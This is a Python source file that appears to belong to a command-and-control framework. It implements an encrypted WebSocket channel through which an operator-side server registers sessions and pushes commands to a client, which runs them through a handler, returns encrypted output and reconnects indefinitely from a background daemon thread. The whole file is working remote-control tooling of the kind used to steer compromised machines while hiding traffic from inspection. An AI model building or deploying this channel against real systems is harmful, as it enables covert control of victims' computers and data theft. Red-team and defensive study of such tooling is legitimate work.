"""WebSocket transport for bidirectional C2 communication.
Lower latency than HTTP polling, maintains persistent connection."""

import asyncio
import websockets
import json
import threading
from typing import Optional, Callable
from c2.crypto.encryption import create_cipher


class WebSocketClient:
    """WebSocket-based C2 transport. Replaces HTTP polling with a persistent
    bidirectional connection."""

    def __init__(self, server_url: str, encryption_key: str, client_id: str):
        self.server_url = server_url  # e.g. ws://host:port/ws
        self.cipher = create_cipher(encryption_key)
        self.client_id = client_id
        self.ws = None
        self._command_callback: Optional[Callable] = None
        self._running = False

    def set_command_handler(self, callback: Callable[[str], None]):
        """Set callback function that receives decrypted commands from server."""
        self._command_callback = callback

    async def connect(self):
        """Establish WebSocket connection and begin receive loop."""
        self._running = True
        self.ws = await websockets.connect(self.server_url)

        # Send initial registration with encrypted client ID
        encrypted_id = self.cipher.encrypt(self.client_id.encode()).decode()
        await self.ws.send(json.dumps({
            "type": "register",
            "client_id": encrypted_id,
        }))

        # Start receive loop
        while self._running:
            try:
                message = await asyncio.wait_for(self.ws.recv(), timeout=1.0)
                data = json.loads(message)

                if data.get("type") == "command":
                    encrypted_cmd = data.get("data", "")
                    try:
                        command = self.cipher.decrypt(encrypted_cmd.encode()).decode()
                        if self._command_callback:
                            self._command_callback(command)
                    except Exception:
                        print("Failed to decrypt WebSocket command")

                elif data.get("type") == "ping":
                    await self._send_message({"type": "pong"})

            except asyncio.TimeoutError:
                continue
            except websockets.exceptions.ConnectionClosed:
                print("WebSocket connection closed by server")
                break
            except json.JSONDecodeError:
                print("Received invalid WebSocket message")
                continue

    async def _send_message(self, data: dict):
        """Send a JSON message over WebSocket."""
        if self.ws and not self.ws.closed:
            await self.ws.send(json.dumps(data))

    async def send_output(self, output: str):
        """Encrypt and send command output back to server."""
        try:
            encrypted = self.cipher.encrypt(output.encode()).decode()
            await self._send_message({
                "type": "response",
                "data": encrypted,
            })
        except Exception as e:
            print(f"Failed to send WebSocket output: {e}")

    async def close(self):
        """Close WebSocket connection gracefully."""
        self._running = False
        if self.ws and not self.ws.closed:
            await self.ws.close()


class WebSocketServer:
    """Server-side WebSocket handler for bidirectional communication."""

    def __init__(self, encryption_key: str, session_mgr, activity_log=None):
        self.cipher = create_cipher(encryption_key)
        self.session_mgr = session_mgr
        self.activity_log = activity_log
        self._connected_clients: dict = {}  # session_id -> websocket

    async def handler(self, websocket, path):
        """Handle incoming WebSocket connections."""
        client_id = None
        session_id = None

        try:
            async for message in websocket:
                try:
                    data = json.loads(message)
                except json.JSONDecodeError:
                    continue

                if data.get("type") == "register":
                    encrypted_id = data.get("client_id", "")
                    try:
                        client_str = self.cipher.decrypt(encrypted_id.encode()).decode()
                    except Exception:
                        print("Failed to decrypt WebSocket client registration")
                        await websocket.close()
                        return

                    session_id = self.session_mgr.register_client(client_str)
                    self._connected_clients[session_id] = websocket
                    client_id = client_str
                    print(f"WebSocket client connected: session {session_id}")

                    if self.activity_log:
                        self.activity_log.log_event(
                            "ws_connect", f"session_id={session_id}", session_id
                        )

                elif data.get("type") == "response":
                    encrypted_output = data.get("data", "")
                    try:
                        output = self.cipher.decrypt(encrypted_output.encode()).decode()
                        print(output)
                        if self.activity_log and session_id:
                            self.activity_log.log_command(session_id, "", output=output)
                    except Exception:
                        print("Failed to decrypt WebSocket response")

                elif data.get("type") == "pong":
                    pass  # Keepalive response, do nothing

        except websockets.exceptions.ConnectionClosed:
            if session_id:
                self._connected_clients.pop(session_id, None)
                print(f"WebSocket client disconnected: session {session_id}")
                if self.activity_log:
                    self.activity_log.log_event(
                        "ws_disconnect", f"session_id={session_id}", session_id
                    )

    async def send_command(self, session_id: int, command: str):
        """Send an encrypted command to a connected WebSocket client."""
        ws = self._connected_clients.get(session_id)
        if not ws or ws.closed:
            return False

        try:
            encrypted = self.cipher.encrypt(command.encode()).decode()
            await ws.send(json.dumps({
                "type": "command",
                "data": encrypted,
            }))
            if self.activity_log:
                self.activity_log.log_command(session_id, command)
            return True
        except Exception as e:
            print(f"Failed to send WebSocket command: {e}")
            return False

    def is_connected(self, session_id: int) -> bool:
        """Check if a WebSocket client is connected for a session."""
        ws = self._connected_clients.get(session_id)
        return ws is not None and not ws.closed


def run_websocket_client(server_url: str, encryption_key: str, client_id: str, command_handler: Callable):
    """Convenience function to run the WebSocket client in a thread."""
    client = WebSocketClient(server_url, encryption_key, client_id)
    client.set_command_handler(command_handler)

    async def _run():
        while True:
            try:
                await client.connect()
            except Exception:
                print("WebSocket connection failed, retrying in 5s...")
                await asyncio.sleep(5)

    loop = asyncio.new_event_loop()
    thread = threading.Thread(target=loop.run_until_complete, args=(_run(),), daemon=True)
    thread.start()
    return client, thread
